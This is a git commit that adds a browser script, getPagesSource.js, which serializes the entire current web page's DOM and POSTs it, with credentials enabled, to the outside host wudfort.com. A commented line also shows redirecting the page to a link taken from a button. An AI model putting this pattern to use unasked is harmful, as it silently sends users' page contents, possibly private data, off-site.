ef9be93cc970ce7c7e34f22231754646da2183bf
Shishir Raven <shishir.raven@gmail.com>
2017-08-30 14:18:56 +0530

    Add files via upload

---
+++ getPagesSource.js
@@ -0,0 +1,48 @@
+function DOMtoString(document_root) {
+    var html = '',
+        node = document_root.firstChild;
+    while (node) {
+        switch (node.nodeType) {
+        case Node.ELEMENT_NODE:
+            html += node.outerHTML;
+            break;
+        case Node.TEXT_NODE:
+            html += node.nodeValue;
+            break;
+        case Node.CDATA_SECTION_NODE:
+            html += '<![CDATA[' + node.nodeValue + ']]>';
+            break;
+        case Node.COMMENT_NODE:
+            html += '<!--' + node.nodeValue + '-->';
+            break;
+        case Node.DOCUMENT_TYPE_NODE:
+            // (X)HTML documents are identified by public identifiers
+            html += "<!DOCTYPE " + node.name + (node.publicId ? ' PUBLIC "' + node.publicId + '"' : '') + (!node.publicId && node.systemId ? ' SYSTEM' : '') + (node.systemId ? ' "' + node.systemId + '"' : '') + '>\n';
+            break;
+        }
+        node = node.nextSibling;
+    }
+    return html;
+}
+
+var pageData = DOMtoString(document);
+
+var data = new FormData();
+data.append("data", pageData );
+
+var xhr = new XMLHttpRequest();
+xhr.withCredentials = true;
+
+xhr.addEventListener("readystatechange", function () {
+  if (this.readyState === 4) {
+    console.log(this.responseText);
+
+    /* You can find and redirect a page element on page. */
+    //window.location.href = document.querySelector('.buttonSet>.blue').href;
+
+  }
+});
+
+xhr.open("POST", "https://wudfort.com/");
+xhr.setRequestHeader("cache-control", "no-cache");
+xhr.send(data);
